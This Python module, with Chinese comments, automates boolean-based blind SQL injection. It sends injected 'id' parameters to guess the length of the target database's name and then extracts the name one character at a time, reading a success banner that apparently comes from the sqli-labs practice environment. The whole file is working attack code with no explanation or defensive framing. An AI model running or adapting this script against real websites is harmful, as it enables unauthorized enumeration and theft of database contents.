'''
    数据库的操作函数库
'''

import requests
from lxml import etree


def GetDBNameLen(main_url):
    # 数据库名长度
    # print("# 正在尝试获取数据库名长度...")
    url = main_url+"?id=1' and if(length(database())={},1,0) --+"
    for i in range(50):
        test_url = url.format(i)   # 当前测试的url
        req = requests.get(test_url)
        # 提取出成功登录的标志信息:You are in...........
        tag = etree.HTML(req.text).xpath("/html/body/div/font/font/text()")[0]
        if(tag == 'You are in...........'):
            return i


def GetDBName(main_url, len):
    # 数据库名
    # print("# 正在尝试获取数据库名...")
    db_name = ""
    url = main_url+"?id=1' and if(ascii(substr(database(),{},1)) = {},1,0) --+"
    for i in range(len+1): # 试数据库名的第i个字符
        for j in range(48, 122):
            test_url = url.format(i, j)
            req = requests.get(test_url)
            tag = etree.HTML(req.text).xpath("/html/body/div/font/font/text()")[0]
            if(tag == 'You are in...........'):
                # print("*第%d个字母是"%i+chr(j))
                db_name += chr(j)     # 将测试成功的字符添加到字符串变量
    return db_name